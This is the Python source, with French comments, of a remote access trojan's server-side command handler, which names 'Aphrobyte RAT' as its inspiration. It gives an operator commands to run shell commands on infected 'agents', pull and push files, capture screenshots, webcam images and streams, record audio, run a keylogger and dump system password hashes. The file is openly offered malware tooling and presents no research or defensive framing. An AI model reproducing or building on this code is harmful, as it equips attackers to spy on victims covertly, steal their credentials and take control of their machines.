"""
Command Handler - Gestionnaire des commandes serveur
Inspiré de l'architecture de commandes d'Aphrobyte RAT
"""

import os
import time
import base64
from typing import Optional, Dict, Any
import logging

from server.core.session_manager import SessionManager
from server.handlers.file_handler import FileHandler
from server.handlers.shell_handler import ShellHandler
from server.handlers.system_handler import SystemHandler
from server.handlers.media_handler import MediaHandler
from server.utils.config import ServerConfig
from shared.protocol import Protocol, MessageType

logger = logging.getLogger(__name__)

class CommandHandler:
    """Gestionnaire principal des commandes serveur"""
    
    def __init__(self, session_manager: SessionManager, config: ServerConfig):
        self.session_manager = session_manager
        self.config = config
        
        # Handlers spécialisés
        self.file_handler = FileHandler(config)
        self.shell_handler = ShellHandler()
        self.system_handler = SystemHandler()
        self.media_handler = MediaHandler(config)
        
        # Commandes disponibles
        self.server_commands = {
            'help': self._cmd_help,
            'sessions': self._cmd_sessions,
            'interact': self._cmd_interact,
            'exit': self._cmd_exit,
            'quit': self._cmd_exit,
            'clear': self._cmd_clear,
            'stats': self._cmd_stats,
            'cleanup': self._cmd_cleanup,
            'broadcast': self._cmd_broadcast,
            'back': self._cmd_back
        }
        
        self.agent_commands = {
            'help': self._agent_help,
            'shell': self._agent_shell,
            'ipconfig': self._agent_ipconfig,
            'sysinfo': self._agent_sysinfo,
            'download': self._agent_download,
            'upload': self._agent_upload,
            'screenshot': self._agent_screenshot,
            'search': self._agent_search,
            'webcam_snapshot': self._agent_webcam_snapshot,
            'webcam_stream': self._agent_webcam_stream,
            'keylogger': self._agent_keylogger,
            'record_audio': self._agent_record_audio,
            'hashdump': self._agent_hashdump,
            'back': self._cmd_back
        }
        
        logger.info("CommandHandler initialisé")
    
    def handle_command(self, command: str) -> Optional[str]:
        """Point d'entrée principal pour traiter les commandes"""
        if not command.strip():
            return None
        
        parts = command.strip().split()
        cmd = parts[0].lower()
        args = parts[1:] if len(parts) > 1 else []
        
        try:
            # Si on est en interaction avec un agent
            if self.session_manager.current_session:
                return self._handle_agent_command(cmd, args, command)
            else:
                return self._handle_server_command(cmd, args, command)
                
        except Exception as e:
            logger.error(f"Erreur lors du traitement de '{command}': {e}")
            return f"[!] Erreur: {e}"
    
    def _handle_server_command(self, cmd: str, args: list, full_command: str) -> Optional[str]:
        """Traite les commandes au niveau serveur"""
        if cmd in self.server_commands:
            return self.server_commands[cmd](args)
        else:
            return f"Commande serveur inconnue: '{cmd}'. Tapez 'help' pour l'aide."
    
    def _handle_agent_command(self, cmd: str, args: list, full_command: str) -> Optional[str]:
        """Traite les commandes destinées à un agent"""
        session = self.session_manager.get_current_session()
        
        if not session:
            self.session_manager.current_session = None
            return "Session expirée. Retour au menu principal."
        
        if cmd in self.agent_commands:
            return self.agent_commands[cmd](session, args, full_command)
        else:
            return f"Commande agent inconnue: '{cmd}'. Tapez 'help' pour l'aide."
    
    # === COMMANDES SERVEUR ===
    
    def _cmd_help(self, args: list) -> str:
        """Affiche l'aide des commandes serveur"""
        help_text = \"\"\"
╔════════════════════════════════════════════════════════════╗
║                    RAT SERVER - AIDE                       ║
╠════════════════════════════════════════════════════════════╣
║ COMMANDES SERVEUR:                                         ║
║   help                 - Affiche cette aide               ║
║   sessions             - Liste les agents connectés        ║
║   interact <agent_id>  - Interagit avec un agent         ║
║   stats                - Statistiques du serveur          ║
║   cleanup              - Nettoie les sessions inactives   ║
║   broadcast <message>  - Diffuse un message à tous        ║
║   clear                - Efface l'écran                   ║
║   exit / quit          - Quitte le serveur                ║
╚════════════════════════════════════════════════════════════╝
        \"\"\"
        return help_text
    
    def _cmd_sessions(self, args: list) -> str:
        """Liste les sessions actives"""
        return self.session_manager.list_sessions_formatted()
    
    def _cmd_interact(self, args: list) -> str:
        """Passe en mode interaction avec un agent"""
        if not args:
            return "Usage: interact <agent_id>"
        
        session_id = args[0]
        
        if self.session_manager.set_current_session(session_id):
            session = self.session_manager.get_session(session_id)
            return (
                f"\\n╔══════════════════════════════════════════════╗\\n"
                f"║ Interaction avec {session_id:20s} ║\\n"
                f"╚══════════════════════════════════════════════╝\\n"
                f"Informations de l'agent:\\n"
                f"{session.get_info_summary()}\\n\\n"
                f"Tapez 'help' pour voir les commandes disponibles.\\n"
                f"Tapez 'back' pour revenir au menu principal."
            )
        else:
            return f"Agent '{session_id}' non trouvé ou inactif."
    
    def _cmd_stats(self, args: list) -> str:
        """Affiche les statistiques du serveur"""
        stats = self.session_manager.get_statistics()
        uptime_hours = stats['uptime_seconds'] // 3600
        uptime_minutes = (stats['uptime_seconds'] % 3600) // 60
        
        return (
            f"\\n╔════════════════════════════════════╗\\n"
            f"║         STATISTIQUES SERVEUR       ║\\n"
            f"╠════════════════════════════════════╣\\n"
            f"║ Sessions actives: {stats['active_sessions']:14d} ║\\n"
            f"║ Sessions totales: {stats['total_sessions']:14d} ║\\n"
            f"║ Créées au total:  {stats['total_created']:14d} ║\\n"
            f"║ Uptime: {uptime_hours:02d}h{uptime_minutes:02d}m                 ║\\n"
            f"║ Session courante: {(stats['current_session'] or 'Aucune')[:14]:14s} ║\\n"
            f"╚════════════════════════════════════╝"
        )
    
    def _cmd_cleanup(self, args: list) -> str:
        """Nettoie les sessions inactives"""
        timeout = int(args[0]) if args and args[0].isdigit() else 300
        removed = self.session_manager.cleanup_inactive_sessions(timeout)
        return f"Sessions inactives supprimées: {removed}"
    
    def _cmd_broadcast(self, args: list) -> str:
        """Diffuse un message à tous les agents"""
        if not args:
            return "Usage: broadcast <message>"
        
        message = ' '.join(args)
        broadcast_msg = Protocol.create_message(
            MessageType.BROADCAST,
            {'message': message, 'timestamp': time.time()}
        )
        
        sent_count = self.session_manager.broadcast_message(broadcast_msg)
        return f"Message diffusé à {sent_count} agents"
    
    def _cmd_clear(self, args: list) -> str:
        """Efface l'écran"""
        os.system('cls' if os.name == 'nt' else 'clear')
        return ""
    
    def _cmd_back(self, args: list) -> str:
        """Retourne au menu principal"""
        self.session_manager.current_session = None
        return "Retour au menu principal"
    
    def _cmd_exit(self, args: list) -> str:
        """Quitte le serveur"""
        raise KeyboardInterrupt("Arrêt demandé par l'utilisateur")
    
    # === COMMANDES AGENT ===
    
    def _agent_help(self, session, args: list, full_command: str) -> str:
        """Affiche l'aide des commandes agent"""
        help_text = \"\"\"
╔═══════════════════════════════════════════════════════════════╗
║                     COMMANDES AGENT                          ║
╠═══════════════════════════════════════════════════════════════╣
║ SYSTÈME:                                                      ║
║   help                    - Affiche cette aide               ║
║   shell <command>         - Exécute une commande shell       ║
║   ipconfig                - Configuration réseau             ║
║   sysinfo                 - Informations système             ║
║                                                               ║
║ FICHIERS:                                                     ║
║   download <file>         - Télécharge un fichier            ║
║   upload <local> <remote> - Upload un fichier                ║
║   search <filename>       - Recherche un fichier             ║
║                                                               ║
║ SURVEILLANCE:                                                 ║
║   screenshot              - Capture d'écran                  ║
║   webcam_snapshot         - Photo webcam                     ║
║   webcam_stream           - Stream webcam                    ║
║   keylogger <start/stop>  - Keylogger                       ║
║   record_audio <duration> - Enregistrement audio            ║
║                                                               ║
║ AVANCÉ:                                                       ║
║   hashdump                - Extraction hashes système        ║
║                                                               ║
║   back                    - Retour menu principal            ║
╚═══════════════════════════════════════════════════════════════╝
        \"\"\"
        return help_text
    
    def _agent_shell(self, session, args: list, full_command: str) -> Optional[str]:
        """Exécute une commande shell sur l'agent"""
        if not args:
            return "Usage: shell <command>"
        
        command = ' '.join(args)
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'shell', 'args': command}
        )
        
        if session.send_message(message):
            return f"Commande shell envoyée: {command}"
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_ipconfig(self, session, args: list, full_command: str) -> Optional[str]:
        """Récupère la configuration réseau"""
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'ipconfig'}
        )
        
        if session.send_message(message):
            return "Demande de configuration réseau envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_sysinfo(self, session, args: list, full_command: str) -> Optional[str]:
        """Affiche les informations système détaillées"""
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'sysinfo'}
        )
        
        if session.send_message(message):
            return "Demande d'informations système envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_download(self, session, args: list, full_command: str) -> Optional[str]:
        """Télécharge un fichier depuis l'agent"""
        if not args:
            return "Usage: download <file_path>"
        
        file_path = ' '.join(args)
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'download', 'args': file_path}
        )
        
        if session.send_message(message):
            return f"Demande de téléchargement envoyée: {file_path}"
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_upload(self, session, args: list, full_command: str) -> Optional[str]:
        """Upload un fichier vers l'agent"""
        if len(args) < 2:
            return "Usage: upload <local_file> <remote_path>"
        
        local_file = args[0]
        remote_path = args[1]
        
        try:
            return self.file_handler.upload_file_to_agent(session, local_file, remote_path)
        except Exception as e:
            return f"Erreur lors de l'upload: {e}"
    
    def _agent_screenshot(self, session, args: list, full_command: str) -> Optional[str]:
        """Prend une capture d'écran"""
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'screenshot'}
        )
        
        if session.send_message(message):
            return "Demande de capture d'écran envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_search(self, session, args: list, full_command: str) -> Optional[str]:
        """Recherche un fichier"""
        if not args:
            return "Usage: search <filename>"
        
        filename = ' '.join(args)
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'search', 'args': filename}
        )
        
        if session.send_message(message):
            return f"Recherche lancée pour: {filename}"
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_webcam_snapshot(self, session, args: list, full_command: str) -> Optional[str]:
        """Prend une photo avec la webcam"""
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'webcam_snapshot'}
        )
        
        if session.send_message(message):
            return "Demande de photo webcam envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_webcam_stream(self, session, args: list, full_command: str) -> Optional[str]:
        """Démarre/arrête le stream webcam"""
        action = args[0] if args else 'start'
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'webcam_stream', 'args': action}
        )
        
        if session.send_message(message):
            return f"Commande webcam stream ({action}) envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_keylogger(self, session, args: list, full_command: str) -> Optional[str]:
        """Contrôle le keylogger"""
        action = args[0] if args else 'start'
        
        if action not in ['start', 'stop', 'dump']:
            return "Usage: keylogger <start|stop|dump>"
        
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'keylogger', 'args': action}
        )
        
        if session.send_message(message):
            return f"Commande keylogger ({action}) envoyée..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_record_audio(self, session, args: list, full_command: str) -> Optional[str]:
        """Enregistre l'audio"""
        duration = args[0] if args and args[0].isdigit() else '10'
        
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'record_audio', 'args': duration}
        )
        
        if session.send_message(message):
            return f"Enregistrement audio ({duration}s) démarré..."
        else:
            return "Erreur lors de l'envoi de la commande"
    
    def _agent_hashdump(self, session, args: list, full_command: str) -> Optional[str]:
        """Extraction des hashes système"""
        message = Protocol.create_message(
            MessageType.COMMAND,
            {'command': 'hashdump'}
        )
        
        if session.send_message(message):
            return "⚠️  Demande d'extraction de hashes envoyée (fonction sensible) ⚠️"
        else:
            return "Erreur lors de l'envoi de la commande"